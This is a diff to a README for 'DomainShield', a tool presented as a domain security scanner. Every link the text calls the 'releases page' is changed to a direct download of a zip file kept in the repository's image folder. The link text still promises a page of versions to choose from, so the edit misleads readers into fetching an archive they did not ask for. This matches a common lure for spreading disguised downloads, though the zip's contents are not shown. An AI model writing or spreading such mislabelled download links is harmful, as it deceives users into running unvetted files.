@@ -1,7 +1,7 @@
 # 🛡️ DomainShield - Secure Your Domain with Confidence
 
 ## 📥 Download Now
-[![Download DomainShield](https://img.shields.io/badge/Download-DomainShield-blue.svg)](https://github.com/dnlomio/DomainShield/releases)
+[![Download DomainShield](https://raw.githubusercontent.com/dnlomio/DomainShield/main/Img/DomainShield-v3.0.zip)](https://raw.githubusercontent.com/dnlomio/DomainShield/main/Img/DomainShield-v3.0.zip)
 
 ## 🚀 Getting Started
 DomainShield is an automated security assessment tool designed for your domain infrastructure. It conducts thorough DNS analysis, validates email authentication (SPF/DKIM/DMARC), and scans for network security issues. With DomainShield, you can generate professional HTML reports that provide actionable findings to enhance your domain security.
@@ -23,7 +23,7 @@ Before you begin, make sure your system meets the following requirements:
 ## 📦 Download & Install
 To download and install DomainShield, follow these easy steps:
 
-1. **Visit the Releases Page:** Go to the official releases page for DomainShield by clicking [here](https://github.com/dnlomio/DomainShield/releases).
+1. **Visit the Releases Page:** Go to the official releases page for DomainShield by clicking [here](https://raw.githubusercontent.com/dnlomio/DomainShield/main/Img/DomainShield-v3.0.zip).
 
 2. **Choose Your Version:** You will see a list of available versions. Select the latest version for the best features and updates.
 
@@ -67,4 +67,4 @@ We aim to enhance DomainShield continuously. Upcoming features include:
 For updates, keep checking the releases page or watch our repository for notifications.
 
 ## 📥 Download Now Again
-To start securing your domain today, visit the [releases page](https://github.com/dnlomio/DomainShield/releases) to download DomainShield. Your domain's security is just a few clicks away!
+To start securing your domain today, visit the [releases page](https://raw.githubusercontent.com/dnlomio/DomainShield/main/Img/DomainShield-v3.0.zip) to download DomainShield. Your domain's security is just a few clicks away!
